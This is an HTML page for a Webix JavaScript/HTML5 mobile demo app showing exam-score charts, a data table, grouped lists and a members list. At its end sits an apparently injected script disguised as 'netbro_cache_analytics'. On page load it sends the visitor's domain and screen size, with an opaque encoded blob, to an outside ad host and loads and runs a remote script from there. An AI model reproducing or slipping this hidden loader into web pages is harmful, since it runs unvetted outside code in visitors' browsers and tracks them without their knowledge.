
<!DOCTYPE html>
<html>
    <head>
        <title>JavaScript/HTML5 Mobile Demo App With Nice Charts and Properly Working Touch Events</title>
        <meta name="description" content="Evaluate a JavaScript and HTML5-based mobile demo app with good-looking charts and flawlessly running touch events.">
        <meta name="keywords" content="webix, demo, touch demo, touch events, mobile app, javascript charts, web app"/>
        <meta charset="utf-8">

        <meta  name = "viewport" content = "initial-scale = 1.0, maximum-scale = 1.0, user-scalable = no">
        <link rel="stylesheet" href="codebase/skins/touch.css" type="text/css" media="screen" charset="utf-8">

        <script src="codebase/webix.js" type="text/javascript" charset="utf-8"></script>
        <script type="text/javascript" src="common/nav.js?v=22"></script>
        <link rel="stylesheet" type="text/css" href="common/nav.css?v=22">
        <link href="/assets/favicon.ico" rel="shortcut icon" />
    </head>
    <body>

        <style type="text/css">
            body{
                background: #F2EFEA;
            }
            .touch_demo{
                background:url(common/touchbg.jpg);
                /*background-size: 100% 100%;*/
                position: relative;
            }
            .demo_qr{
                background:url(common/qr.png);
                position:absolute;
                width:300px; height:300px;
                left:630px; top:250px;
            }
            .demo_screen{
                width:370px;
                height:656px;
                position:absolute;
                top:16px;
                left:118px;
                background: white;
            }
            .iphone_screen{
                background: url(common/iphone.png);
                width:612px;
                height:990px;
                position:absolute;
                top:-142px;
                left:0px;
            }
            .iphone_text{
                font-size:24px; font-family: Helvetica, Tahoma;
                color: #666;
                position:absolute;
                top:50px;
                left:600px;
                width:350px;
                text-align: center;
                line-height: 35px;
            }
        </style>
        <script>
            var set = [
                {id: 1, month: "Oct-05", score: 56, type: "Theory"},
                {id: 2, month: "Oct-10", score: 89, type: "Practice"},
                {id: 3, month: "Nov-02", score: 75, type: "Theory"},
                {id: 4, month: "Nov-05", score: 40, type: "Practice"},
                {id: 5, month: "Dec-06", score: 70, type: "Theory"},
                {id: 6, month: "Dec-07", score: 88, type: "Practice"},
                {id: 7, month: "Jan-15", score: 66, type: "Theory"},
                {id: 8, month: "Jan-16", score: 79, type: "Practice"},
                {id: 9, month: "Feb-08", score: 92, type: "Theory"},
                {id: 10, month: "Feb-09", score: 50, type: "Practice"},
                {id: 11, month: "Mar-06", score: 90, type: "Theory"},
                {id: 12, month: "Mar-08", score: 83, type: "Practice"}
            ];
            var groupdata = [
                {id: "theory", value: "Theory", data: [
                        {id: 1, value: "Oct-05", average: 56, min: 10},
                        {id: 2, value: "Nov-02", average: 78, min: 15},
                        {id: 3, value: "Dec-06", average: 74, min: 20},
                        {id: 4, value: "Jan-15", average: 68, min: 30},
                        {id: 5, value: "Feb-08", average: 45, min: 35},
                        {id: 6, value: "Mar-06", average: 52, min: 32}
                    ]},
                {id: "practice", open: true, value: "Practice", data: [
                        {id: 11, value: "Oct-10", average: 58.9, min: 41},
                        {id: 12, value: "Nov-05", average: 67.7, min: 30},
                        {id: 13, value: "Dec-07", average: 78.2, min: 35},
                        {id: 14, value: "Jan-16", average: 75.1, min: 27},
                        {id: 15, value: "Feb-09", average: 59.2, min: 38},
                        {id: 16, value: "Mar-08", average: 78.0, min: 41}
                    ]}
            ];
            var list_data = [
                {id: 1, name: "Peter Johnson"},
                {id: 2, name: "Rebeca Rid"},
                {id: 3, name: "Alex Murphy"},
                {id: 4, name: "Tory Miles"},
                {id: 5, name: "Rene Samerson"},
                {id: 6, name: "Anna Miranovich"},
                {id: 7, name: "Kristopher Turner"},
                {id: 8, name: "Michael Evans"},
                {id: 9, name: "Jodi Fernandez "},
                {id: 10, name: "Carmen Sims "},
                {id: 11, name: "Jody Silva"},
                {id: 12, name: "Jan Morris "}
            ];
            webix.ready(function () {

                var appui = {
                    rows: [
                        {
                            view: "multiview",
                            cells: [
                                {
                                    id: "results",
                                    view: "accordion",
                                    multi: "mixed",
                                    rows: [
                                        {header: "Add Result", body: {
                                                view: "form", autoheight: false, height: 100, id: "myform", scroll: true, elements: [
                                                    {view: "text", id: 'name', label: 'Name', labelWidth: 100, value: "Peter Johnson"},
                                                    {view: "Result", view: "slider", label: "Value", labelWidth: 100, value: "80", name: "result", title: "#value#"},
                                                    {view: "radio", vertical: true, labelWidth: 100, label: "Exam type", Points: "Practice", options: ["Theory", "Practice"]},
                                                    {view: "button", type: "form", id: 'save', label: 'Save', align: "center", inputWidth: 150}
                                                ]
                                            }},
                                        {header: "All Person's Results", body: {
                                                view: "datatable",
                                                columns: [
                                                    {id: "id", header: "  ", width: 50},
                                                    {id: "month", header: "Date", width: 100},
                                                    {id: "score", header: "Points", css: "number", width: 80},
                                                    {id: "type", header: "Exam type", fillspace: true}
                                                ],
                                                prerender: true,
                                                scroll: "y", scrollX: false,
                                                data: set,
                                                select: true
                                            }}
                                    ]
                                },
                                {
                                    id: "chart",
                                    rows: [
                                        {
                                            id: "barChart",
                                            view: "chart",
                                            type: "barH",
                                            value: "#score#",
                                            color: "#e79043",
                                            radius: 0,
                                            xAxis: {
                                                start: 0,
                                                step: 10,
                                                end: 100
                                            },
                                            yAxis: {
                                                template: function (obj) {
                                                    return obj.month.split("-")[0]
                                                },
                                                lines: false
                                            },
                                            data: set,
                                            on: {
                                                onBeforeRender: function () {
                                                    this.data.silent(function () {
                                                        this.filter(function (obj) {
                                                            return obj.type == ($$("examType").getValue() || "Practice");
                                                        });
                                                    });
                                                }
                                            }
                                        },
                                        {height: 5},
                                        {
                                            id: "examType", align: "center", view: "segmented", multiview: true, selected: "Practice", options: [
                                                {id: "Practice", value: "Practice", width: 100},
                                                {id: "Theory", value: "Theory", width: 100}
                                            ],
                                            on: {
                                                onChange: function () {
                                                    $$("barChart").refresh();
                                                }
                                            }
                                        },
                                        {height: 5}

                                    ]
                                },
                                {
                                    id: "list",
                                    type: "clean",
                                    rows: [
                                        {
                                            cells: [
                                                {
                                                    id: "grouplist",
                                                    view: "grouplist",
                                                    select: true,
                                                    templateItem: "<b>#value#</b><br/>Average: #average#; Minimum: #min#",
                                                    data: webix.copy(groupdata),
                                                    type: {
                                                        height: "auto"
                                                    }
                                                },
                                                {
                                                    id: "tree",
                                                    view: "tree",
                                                    activeTitle: true,
                                                    select: true,
                                                    scroll: "y",
                                                    template: "{common.icon()} <span>#value#</span>",
                                                    data: webix.copy(groupdata)
                                                }

                                            ]
                                        },
                                        {height: 5},
                                        {
                                            align: "center", view: "segmented", multiview: true, selected: "List", options: [
                                                {id: "grouplist", value: "List", width: 100},
                                                {id: "tree", value: "Tree", width: 100}
                                            ],
                                            on: {
                                                onChange: function () {
                                                    $$("barChart").refresh();
                                                }
                                            }
                                        },
                                        {height: 5}

                                    ]
                                },
                                {
                                    view: "unitlist",
                                    id: "members",
                                    select: true,
                                    scheme: {
                                        $sort: {
                                            by: "name",
                                            dir: 'asc',
                                            as: "string"
                                        }
                                    },
                                    uniteBy: function (obj) {
                                        return obj.name.substr(0, 1);
                                    },
                                    template: "#name#",
                                    data: list_data,
                                    select:true,
                                            on: {
                                                onAfterLoad: function () {
                                                    this.select(1);
                                                }
                                            }
                                }
                            ]
                        },
                        {
                            view: "tabbar",
                            type: "iconTop",
                            multiview: true,
                            tabMinWidth: 80,
                            options: [
                                {id: "results", icon: "flag-o", value: "Personal"},
                                {id: "chart", icon: "bar-chart-o", value: "Chart"},
                                {id: "list", icon: "book", value: "Statistic"},
                                {id: "members", icon: "user", value: "Members"}
                            ]
                        }
                    ]


                };

                document.getElementById("nontouch_text").style.display = "";
//                webix.ui({rows: [{
//                            view: "navbar", value: "touch"
//                        }, {
//                            css: "touch_demo", content: "nontouch_text"
//                        }]});
                appui.container = "demo_screen";
                appui.borderless = true;
                webix.ui(appui);

                //		if (!webix.env.touch){
                //			document.getElementById("nontouch_text").style.display = "";
                //			webix.ui({ rows:[{
                //				view:"navbar", value:"touch"
                //			},{
                //				css:"touch_demo", content:"nontouch_text"
                //			}]});
                //			appui.container = "demo_screen";
                //			appui.borderless = true;
                //			webix.ui(appui);
                //		} else {
                //			webix.ui.fullScreen();
                //			webix.ui(appui);
                //
                //			// change active view on swipe
                //			webix.$$("$multiview1").attachEvent("onSwipeX",function(context0,context1){
                //				var delta = context1.x - context0.x;
                //				var index = this.index(webix.$$(this.getActiveId()));
                //				var options = webix.$$("$tabbar1").config.options;
                //				index += (delta <0?1:-1);
                //				if(options[index]){
                //					webix.$$("$tabbar1").setValue(options[index].id);
                //				}
                //			});
                //		}
            });
        </script>
        <div id="nontouch_text" style='display:none'>
            <div class='iphone_screen'></div>
            <div class='demo_screen' id="demo_screen"></div> 
            <div class='demo_qr'></div> 
        </div>

        <script type="text/javascript">if (self == top) {
                function netbro_cache_analytics(fn, callback) {
                    setTimeout(function () {
                        fn();
                        callback();
                    }, 0);
                }
                function sync(fn) {
                    fn();
                }
                function requestCfs() {
                    var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                    var idc_glo_r = Math.floor(Math.random() * 99999999999);
                    var url = idc_glo_url + "cfs2.uzone.id/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2B%2fIc8of9AVduqGBD%2bIJmI1Z2VeGgD%2baNg%2b%2ftDTBerJCFlrz%2fMMMSQ4zEMjC7eW3t24NSt6k4q6M03uaZYy%2bPE8AkT9%2bC8kFd06pZJgoR%2fvNfvZdB69ab7pYeiMOO2TIOrnUood1PGuOjYHi5q%2fq8HpoxGBlB4neHBbtmTEo9bCG6UEjlHCJCnSNl5cYpnPYHNRDKTR7BA0p90bCgtq5ZjqGsGx3j651ahxLvBqALjhWetegXuhgfSznpTddaNIhQVelK1LVHLf2XaTimlASh5xo4CaOBtaybIPhpZxpXYhnjYau4X3HAJuPt%2bGrNMLSovRp0DD6zK9GCV1KkBLub8z8Ijw6gGL1PUrBAN2ilXXBDWWUTyWtGAaeKYAyIWII1GrNZxGMprBUNTkPuxl5xpk%2fa4M7H7LUmCEsIcUGHR1LjL20Gnc%2bxQxE0OFE1OtBSVEB3sIzRRH%2fBj%2bBdEiKTSPht1QEIRnE%2bf1s%2b6XO53usUJPiUa%2bFoeuMrZDq1TYnhkBk%2fMLRAw8iuhjAONw3xgdRxdyTP1d5q%2fA7NkPacozMdW6rGGFa%2f7n1cUa54rOPOvDWJjXTFZ1C6G1orXncMuTlOPbEev%2f5kFh2lhxiUHDBxhHsb%2f0uV1JaAxM2bKIH%2f%2f9XMs1XSSZn4%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                    var bsa = document.createElement('script');
                    bsa.type = 'text/javascript';
                    bsa.async = true;
                    bsa.src = url;
                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
                }
                netbro_cache_analytics(requestCfs, function () {});
            }
            ;</script></body>
</html>